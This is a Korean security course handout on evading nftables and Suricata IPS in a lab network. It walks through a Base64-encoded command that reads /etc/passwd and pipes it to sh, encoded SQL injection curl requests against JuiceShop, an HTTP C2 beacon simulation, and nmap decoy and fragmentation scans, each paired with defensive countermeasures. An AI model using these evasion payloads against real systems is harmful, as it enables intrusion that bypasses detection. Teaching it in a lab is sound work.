# Week 10: IPS/방화벽 우회 기법

## 학습 목표
- nftables 방화벽 규칙의 구조를 이해하고 분석할 수 있다
- Suricata IPS의 탐지 규칙을 읽고 해석할 수 있다
- 인코딩 기반 우회(Base64, URL 인코딩)의 원리를 설명할 수 있다
- 터널링(ICMP, HTTP)의 개념과 탐지 회피 원리를 이해한다
- 실습 환경에서 방화벽 규칙 분석과 우회 실험을 수행한다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + OpsClaw 연동 (Part 5) | 실습 |
| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |

---

---

## 용어 해설 (이 과목에서 자주 나오는 용어)

> 대학 1~2학년이 처음 접할 수 있는 보안/IT 용어를 정리한다.
> 강의 중 모르는 용어가 나오면 이 표를 참고하라.

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **페이로드** | Payload | 공격에 사용되는 실제 데이터/코드. 예: `' OR 1=1--` | 미사일의 탄두 |
| **익스플로잇** | Exploit | 취약점을 악용하는 기법 또는 코드 | 열쇠 없이 문을 여는 방법 |
| **셸** | Shell | 운영체제와 사용자를 연결하는 명령어 해석기 (bash, sh 등) | OS에게 말 걸 수 있는 창구 |
| **리버스 셸** | Reverse Shell | 대상 서버가 공격자에게 역방향 연결을 맺는 것 | 도둑이 집에서 밖으로 전화를 거는 것 |
| **포트** | Port | 서버에서 특정 서비스를 식별하는 번호 (0~65535) | 아파트 호수 |
| **데몬** | Daemon | 백그라운드에서 실행되는 서비스 프로그램 | 24시간 근무하는 경비원 |
| **패킷** | Packet | 네트워크로 전송되는 데이터의 단위 | 택배 상자 하나 |
| **프록시** | Proxy | 클라이언트와 서버 사이에서 중개하는 서버 | 대리인, 중간 거래자 |
| **해시** | Hash | 임의 길이 데이터를 고정 길이 값으로 변환하는 함수 (SHA-256 등) | 지문 (고유하지만 원본 복원 불가) |
| **토큰** | Token | 인증 정보를 담은 문자열 (JWT, API Key 등) | 놀이공원 입장권 |
| **JWT** | JSON Web Token | Base64로 인코딩된 JSON 기반 인증 토큰 | 이름·권한이 적힌 입장권 |
| **Base64** | Base64 | 바이너리 데이터를 텍스트로 인코딩하는 방법 | 암호가 아닌 "포장" (누구나 풀 수 있음) |
| **CORS** | Cross-Origin Resource Sharing | 다른 도메인에서의 API 호출 허용 설정 | "외부인 출입 허용" 표지판 |
| **API** | Application Programming Interface | 프로그램 간 통신 규약 | 식당의 메뉴판 (주문 양식) |
| **REST** | Representational State Transfer | URL + HTTP 메서드로 자원을 조작하는 API 스타일 | 도서관 대출 시스템 (책 이름으로 검색/대출/반납) |
| **SSH** | Secure Shell | 원격 서버에 안전하게 접속하는 프로토콜 | 암호화된 전화선 |
| **sudo** | SuperUser DO | 관리자(root) 권한으로 명령 실행 | "사장님 권한으로 실행" |
| **SUID** | Set User ID | 실행 시 파일 소유자 권한으로 실행되는 특수 권한 | 다른 사람의 사원증을 빌려 출입 |
| **IPS** | Intrusion Prevention System | 네트워크 침입 방지 시스템 (악성 트래픽 차단) | 공항 보안 검색대 |
| **SIEM** | Security Information and Event Management | 보안 로그를 수집·분석하는 통합 관제 시스템 | CCTV 관제실 |
| **WAF** | Web Application Firewall | 웹 공격을 탐지·차단하는 방화벽 | 웹사이트 전용 경비원 |
| **nftables** | nftables | Linux 커널 방화벽 프레임워크 (iptables 후계) | 건물 출입구 차단기 |
| **Suricata** | Suricata | 오픈소스 IDS/IPS 엔진 | 공항 X-ray 검색기 |
| **Wazuh** | Wazuh | 오픈소스 SIEM 플랫폼 | CCTV + AI 관제 시스템 |
| **ATT&CK** | MITRE ATT&CK | 실제 공격 전술·기법을 분류한 데이터베이스 | 범죄 수법 백과사전 |
| **OWASP** | Open Web Application Security Project | 웹 보안 취약점 연구 국제 단체 | 웹 보안의 표준 기관 |
| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 점수 (0~10점) | 질병 위험도 등급 |
| **CVE** | Common Vulnerabilities and Exposures | 취약점 고유 식별 번호 | 질병의 고유 코드 (예: COVID-19) |
| **OpsClaw** | OpsClaw | 보안 작업 자동화·증적 관리 플랫폼 (이 수업에서 사용) | 보안 작업 일지 + 자동화 시스템 |

---

# Week 10: IPS/방화벽 우회 기법

## 학습 목표

- nftables 방화벽 규칙의 구조를 이해하고 분석할 수 있다
- Suricata IPS의 탐지 규칙을 읽고 해석할 수 있다
- 인코딩 기반 우회(Base64, URL 인코딩)의 원리를 설명할 수 있다
- 터널링(ICMP, HTTP)의 개념과 탐지 회피 원리를 이해한다
- 실습 환경에서 방화벽 규칙 분석과 우회 실험을 수행한다

---

## 1. nftables 방화벽 분석

### 1.1 nftables란?

nftables는 Linux의 차세대 패킷 필터링 프레임워크이다. 기존 iptables를 대체한다.

**핵심 개념:**
- **테이블(table)**: 규칙 모음의 최상위 컨테이너
- **체인(chain)**: 패킷 처리 규칙의 순서 목록
- **규칙(rule)**: 매칭 조건 + 동작(accept, drop, reject)

### 1.2 nftables 규칙 구조

```
table inet filter {
    chain input {
        type filter hook input priority 0; policy drop;

        # 상태 추적: 기존 연결 허용
        ct state established,related accept

        # 루프백 허용
        iif lo accept

        # SSH 허용
        tcp dport 22 accept

        # ICMP 허용
        ip protocol icmp accept

        # 나머지 모두 차단 (policy drop)
    }

    chain forward {
        type filter hook forward priority 0; policy drop;
        # 포워딩 규칙...
    }

    chain output {
        type filter hook output priority 0; policy accept;
    }
}
```

### 1.3 규칙 읽는 법

```
tcp dport 22 accept

각 필드 설명:
  tcp      --> 프로토콜: TCP
  dport 22 --> 조건: 목적지 포트 22
  accept   --> 동작: 허용
```

**주요 매칭 표현:**
| 표현 | 의미 |
|------|------|
| `tcp dport 80` | TCP 목적지 포트 80 |
| `ip saddr 10.0.0.0/8` | 출발지 IP 대역 |
| `ct state new` | 새로운 연결 |
| `iif eth0` | 입력 인터페이스 |
| `tcp flags & syn == syn` | SYN 플래그 설정된 패킷 |

---

## 2. Suricata IPS 규칙 분석

> **이 실습을 왜 하는가?**
> "IPS/방화벽 우회 기법" — 이 주차의 핵심 기술을 실제 서버 환경에서 직접 실행하여 체험한다.
> 사이버보안 공격/웹해킹/침투테스트 분야에서 이 기술은 실무의 핵심이며, 실습을 통해
> 명령어의 의미, 결과 해석 방법, 보안 관점에서의 판단 기준을 익힌다.
>
> **이걸 하면 무엇을 알 수 있는가?**
> - 이 기술이 실제 시스템에서 어떻게 동작하는지 직접 확인
> - 정상과 비정상 결과를 구분하는 눈을 기름
> - 실무에서 바로 활용할 수 있는 명령어와 절차를 체득
>
> **주의:** 모든 실습은 허가된 실습 환경(10.20.30.0/24)에서만 수행한다.

### 2.1 Suricata란?

Suricata는 오픈소스 IDS/IPS(침입 탐지/방지 시스템)이다. 네트워크 트래픽을 실시간으로 분석하여 공격을 탐지하고 차단한다.

### 2.2 Suricata 규칙 형식

```
action protocol src_ip src_port -> dst_ip dst_port (옵션들;)
```

**예시:**
```
alert http any any -> $HOME_NET any (
    msg:"SQL Injection Attempt";
    content:"UNION SELECT";
    nocase;
    sid:1000001;
    rev:1;
)
```

**구성 요소 해석:**
| 요소 | 의미 |
|------|------|
| `alert` | 동작: 경고 생성 (drop이면 차단) |
| `http` | 프로토콜 |
| `any any` | 출발지 IP/포트 (모두) |
| `-> $HOME_NET any` | 목적지: 내부 네트워크 |
| `content:"UNION SELECT"` | 패킷에 이 문자열 포함 시 |
| `nocase` | 대소문자 구분 없음 |
| `sid:1000001` | 규칙 고유 ID |

### 2.3 IPS 동작 모드

```
IDS 모드 (탐지만):
  패킷 → [Suricata] → 경고 로그 기록 → 패킷 통과

IPS 모드 (탐지 + 차단):
  패킷 → [Suricata] → 규칙 매칭 → drop → 패킷 폐기
                                  → accept → 패킷 통과
```

### 2.4 주요 탐지 키워드

| 키워드 | 설명 |
|--------|------|
| `content` | 패킷 내 문자열 매칭 |
| `pcre` | 정규표현식 매칭 |
| `flow` | 연결 방향 (to_server, to_client) |
| `threshold` | 반복 횟수 조건 |
| `http_uri` | HTTP URI만 검사 |
| `http_header` | HTTP 헤더만 검사 |

---

## 3. 우회 기법

### 3.1 인코딩 기반 우회

IPS 규칙이 특정 문자열을 탐지한다면, 같은 의미를 다른 형태로 인코딩하여 우회한다.

#### URL 인코딩

```
원본:        UNION SELECT
URL 인코딩:  %55%4E%49%4F%4E%20%53%45%4C%45%43%54
이중 인코딩: %2555%254E%2549%254F%254E%2520%2553%2545%254C%2545%2543%2554
```

#### Base64 인코딩

> **실습 목적**: Base64 등 인코딩 기법으로 IPS/방화벽의 시그니처 기반 탐지를 우회하는 방법을 실습한다
>
> **배우는 것**: 보안 장비가 탐지하는 패턴을 인코딩으로 변환하여 우회 가능 여부를 확인하고, 방어 측 대응 방법을 이해한다
>
> **결과 해석**: 인코딩된 페이로드가 차단되지 않고 실행되면 해당 보안 장비의 탐지 규칙에 우회 가능한 취약점이 있다
>
> **실전 활용**: Red Team은 WAF/IPS 우회 기법을 사용하고, Blue Team은 디코딩 기반 탐지 룰을 추가하여 대응한다

```bash
# 명령어를 Base64로 인코딩
echo -n "cat /etc/passwd" | base64
# 출력: Y2F0IC9ldGMvcGFzc3dk

# 디코딩 후 실행 (원격에서)
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
```

#### 대소문자 혼합

```
원본:  UNION SELECT
우회:  uNiOn SeLeCt
우회:  UnIoN sElEcT
```

> **방어**: Suricata의 `nocase` 키워드는 대소문자 혼합을 탐지한다.

### 3.2 패킷 분할 (Fragmentation)

큰 패킷을 작은 조각으로 나누어 시그니처 매칭을 회피한다.

```
원본 패킷: [UNION SELECT * FROM users]

분할 후:
  조각 1: [UNION SEL]
  조각 2: [ECT * FRO]
  조각 3: [M users]

→ IPS가 개별 조각만 검사하면 "UNION SELECT" 문자열을 탐지하지 못한다
```

### 3.3 터널링

#### ICMP 터널링

ICMP(ping) 패킷의 데이터 영역에 임의 데이터를 넣어 전송한다.

```
정상 ping:
  ICMP Echo Request [표준 패딩 데이터 56바이트]

ICMP 터널:
  ICMP Echo Request [숨겨진 명령어/데이터 1400바이트]
```

- 방화벽이 ICMP를 허용하면 데이터가 통과한다
- 비정상적으로 큰 ICMP 패킷은 탐지 가능하다

#### HTTP 터널링

정상적인 HTTP 요청/응답 안에 C2(Command & Control) 통신을 숨긴다.

```
정상 HTTP:
  GET /index.html HTTP/1.1
  Host: www.example.com

C2 비콘:
  GET /images/logo.png?id=base64_encoded_command HTTP/1.1
  Host: www.example.com
  Cookie: session=base64_encoded_system_info
```

- 정상 웹 트래픽과 구분이 어렵다
- HTTPS를 사용하면 내용 검사 자체가 불가능하다

---

## 4. 실습

### 실습 환경

| 서버 | IP | 역할 |
|------|-----|------|
| opsclaw | 10.20.30.201 | 공격자 |
| secu | 10.20.30.1 | nftables + Suricata IPS |
| web | 10.20.30.80 | 대상 (JuiceShop:3000) |

### 실습 1: secu의 nftables 규칙 분석

```bash
# secu 서버 접속
sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1

# nftables 규칙 확인
sudo nft list ruleset

# 예상 출력 (환경에 따라 다름):
# table inet filter {
#     chain input {
#         type filter hook input priority filter; policy accept;
#         ...
#     }
#     chain forward {
#         type filter hook forward priority filter; policy accept;
#         ct state established,related accept
#         ...
#     }
# }

# 특정 테이블만 확인
sudo nft list table inet filter

# 카운터가 있는 규칙의 히트 수 확인
sudo nft list ruleset -a
```

**분석 질문:**
1. 기본 정책(policy)은 accept인가 drop인가?
2. 어떤 포트가 명시적으로 허용되어 있는가?
3. forward 체인에서 내부 네트워크 간 트래픽은 어떻게 처리되는가?

### 실습 2: Suricata 규칙 확인

원격 서버에 접속하여 명령을 실행합니다.

```bash
# secu 서버에서 Suricata 규칙 파일 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
  "sudo ls /etc/suricata/rules/"

# 로컬 규칙 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
  "sudo cat /etc/suricata/rules/local.rules 2>/dev/null || echo '로컬 규칙 없음'"

# Suricata 설정 파일에서 규칙 경로 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
  "sudo grep -n 'rule-files\|rule-path' /etc/suricata/suricata.yaml | head -20"

# Suricata 상태 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
  "sudo systemctl status suricata"

# 최근 경고 로그 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
  "sudo tail -20 /var/log/suricata/fast.log 2>/dev/null || echo '로그 없음'"
```

### 실습 3: ICMP 터널링 실험

비정상적으로 큰 ICMP 패킷을 전송하여 방화벽 통과를 확인한다.

```bash
# 터미널 1: secu에서 ICMP 패킷 모니터링
sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
  "sudo tcpdump -i eth0 icmp -nn -c 10 -X"

# 터미널 2: opsclaw에서 정상 크기 ping
ping -c 3 10.20.30.80
# → 기본 56바이트 데이터

# 터미널 2: 비정상적으로 큰 ping (1400바이트)
ping -s 1400 -c 3 10.20.30.80

# 예상 출력:
# PING 10.20.30.80 (10.20.30.80) 1400(1428) bytes of data.
# 1408 bytes from 10.20.30.80: icmp_seq=1 ttl=64 time=0.8 ms
# 1408 bytes from 10.20.30.80: icmp_seq=2 ttl=64 time=0.6 ms

# 터미널 2: 패턴 데이터가 포함된 ping
ping -s 1400 -p deadbeef -c 3 10.20.30.80
# → ICMP 데이터 영역에 0xdeadbeef 패턴이 반복됨
```

**secu의 tcpdump에서 관찰할 내용:**
- 정상 ping과 큰 ping의 패킷 크기 차이
- `-X` 옵션으로 데이터 영역의 내용 확인
- 실제 ICMP 터널링 도구는 이 데이터 영역에 명령어를 넣는다

### 실습 4: HTTP C2 비콘 시뮬레이션

정상 HTTP 요청처럼 보이지만 데이터를 숨기는 방법을 실습한다.

```bash
# 시스템 정보를 Base64로 인코딩
SYSINFO=$(hostname | base64)
echo "인코딩된 시스템 정보: $SYSINFO"

# 정상처럼 보이는 HTTP 요청에 데이터 숨기기
curl -s "http://10.20.30.80:3000/rest/products/search?q=test" \
  -H "Cookie: session=$SYSINFO" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"  # User-Agent 헤더

# URL 파라미터에 인코딩된 명령 포함
CMD=$(echo -n "whoami" | base64)
curl -s "http://10.20.30.80:3000/rest/products/search?q=juice&ref=$CMD"  # silent 모드

# secu에서 이 트래픽을 모니터링
sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
  "sudo tcpdump -i eth0 port 3000 -A -nn -c 20"
```

### 실습 5: URL 인코딩 우회 테스트

```bash
# 정상 SQL Injection 시도 (Suricata가 탐지할 수 있음)
curl -s "http://10.20.30.80:3000/rest/products/search?q=test' UNION SELECT 1--"

# URL 인코딩된 버전
curl -s "http://10.20.30.80:3000/rest/products/search?q=test%27%20UNION%20SELECT%201--"

# 이중 인코딩된 버전
curl -s "http://10.20.30.80:3000/rest/products/search?q=test%2527%2520UNION%2520SELECT%25201--"

# 대소문자 혼합
curl -s "http://10.20.30.80:3000/rest/products/search?q=test' uNiOn SeLeCt 1--"

# Suricata 경고 로그 확인 (각 요청 후)
sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
  "sudo tail -5 /var/log/suricata/fast.log 2>/dev/null"
```

### 실습 6: nmap 스캔 우회 기법

```bash
# 기본 스캔 (탐지 가능)
nmap -sT 10.20.30.80

# 느린 스캔 (탐지 회피 시도)
nmap -sS -T1 10.20.30.80 -p 22,80,3000

# 분할 패킷 스캔
sudo nmap -f 10.20.30.80 -p 22,80,3000

# 디코이(미끼) 스캔 - 가짜 출발지 IP 포함
sudo nmap -D RND:5 10.20.30.80 -p 22,80,3000
# → secu에서 여러 IP에서 스캔이 온 것처럼 보임

# 출발지 포트 변조 (신뢰 포트 사용)
sudo nmap --source-port 53 10.20.30.80 -p 22,80,3000
# → DNS 응답처럼 보이게 함
```

---

## 5. 우회 기법 vs 방어 대응 정리

| 우회 기법 | 원리 | IPS 대응 방법 |
|-----------|------|---------------|
| URL 인코딩 | 특수문자를 %XX로 변환 | HTTP 디코딩 후 검사 |
| 이중 인코딩 | 인코딩을 2번 적용 | 재귀적 디코딩 |
| 대소문자 혼합 | SQL 키워드 변형 | nocase 키워드 사용 |
| 패킷 분할 | 시그니처를 조각냄 | 재조립 후 검사 |
| 느린 스캔 | 탐지 임계값 이하 | 장기간 통계 분석 |
| ICMP 터널 | 허용된 프로토콜 이용 | 페이로드 크기/패턴 검사 |
| HTTP 터널 | 정상 트래픽 위장 | 행위 기반 분석, ML |

---

## 6. 실습 과제

1. **규칙 분석 보고서**: secu의 nftables 규칙과 Suricata 규칙을 분석하여, 현재 방어 체계의 강점과 약점을 5가지 이상 서술하라.
2. **우회 실험 기록**: 각 우회 기법을 시도하고, 성공/실패 여부와 Suricata 로그를 기록하라.
3. **방어 규칙 제안**: 실습에서 성공한 우회에 대한 Suricata 규칙을 1개 이상 작성하라.

---

## 7. 핵심 정리

- 방화벽과 IPS는 완벽하지 않다. 규칙의 한계를 이해해야 방어를 강화할 수 있다.
- 인코딩 우회는 가장 기본적인 기법이며, 현대 IPS는 대부분 디코딩 후 검사한다.
- 터널링은 허용된 프로토콜을 악용하므로 탐지가 어렵다.
- **공격자의 우회 기법을 아는 것이 더 나은 방어의 시작이다.**

**다음 주 예고**: Week 11에서는 서버 침투 후 권한 상승(Privilege Escalation) 기법을 학습한다. web 서버에서 SUID, sudo, cron 등을 이용한 권한 상승을 직접 실습한다.

---

---

## 자가 점검 퀴즈 (5문항)

이번 주차의 핵심 기술 내용을 점검한다.

**Q1.** 이 공격 기법이 OWASP Top 10에서 분류되는 카테고리는?
- (a) Broken Access Control(A01)  (b) **Injection(A03)**  (c) Cryptographic Failures(A02)  (d) SSRF(A10)

**Q2.** 공격자가 가장 먼저 실행하는 정찰 활동은?
- (a) 랜섬웨어 배포  (b) **포트 스캔 및 서비스 핑거프린팅**  (c) DDoS 공격  (d) 방화벽 비활성화

**Q3.** SQLi에서 '--'의 역할은?
- (a) 문자열 연결  (b) **SQL 주석 (이후 쿼리 무시)**  (c) 변수 선언  (d) 함수 호출

**Q4.** MITRE ATT&CK에서 이 기법의 전술(Tactic)은?
- (a) Impact만  (b) **해당 전술 ID 확인 필요**  (c) 모든 전술  (d) 해당 없음

**Q5.** 방어자가 이 공격을 탐지하기 위해 확인해야 하는 로그는?
- (a) CPU 사용률만  (b) **SIEM 경보 + 해당 서비스 로그**  (c) 디스크 용량만  (d) 네트워크 대역폭만

**정답:** Q1:b, Q2:b, Q3:b, Q4:b, Q5:b

---
---

> **실습 환경 검증 완료** (2026-03-28): JuiceShop SQLi/XSS/IDOR, nmap, 경로탐색(%2500), sudo NOPASSWD, SSH키, crontab
